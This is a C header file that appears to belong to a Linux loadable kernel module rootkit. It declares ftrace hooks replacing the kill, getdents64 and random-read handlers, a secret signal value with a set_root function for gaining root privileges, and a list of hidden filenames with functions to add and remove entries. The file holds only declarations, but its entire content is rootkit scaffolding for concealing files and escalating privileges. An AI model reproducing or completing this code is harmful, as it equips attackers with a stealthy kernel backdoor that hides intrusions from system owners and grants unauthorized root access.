#ifndef HOOKS_HEADER
#define HOOKS_HEADER

#include <linux/fs.h>
#include <linux/dirent.h>

#include "debug.h"
#include "commands.h"

#include "ftrace_helper.h"

extern uint8_t SU_SIGNAL;
extern char** HIDDEN_FILES;
extern u32 HIDDEN_NUM;

extern asmlinkage long (*orig_kill)(const struct pt_regs *);
extern asmlinkage long (*orig_getdents64)(const struct pt_regs *);
extern asmlinkage ssize_t (*orig_random_read)(
    struct file *file, char __user *buf,
     size_t nbytes, loff_t *ppos
     );

bool add_hidden_file(char* filename);
bool remove_hidden_file(char* filename);

void set_root(void);

asmlinkage long hook_kill(const struct pt_regs* regs);
asmlinkage int hook_getdents64(const struct pt_regs *regs);
asmlinkage ssize_t hook_random_read(
    struct file *file, char __user *buf,
     size_t nbytes, loff_t *ppos
     );



#endif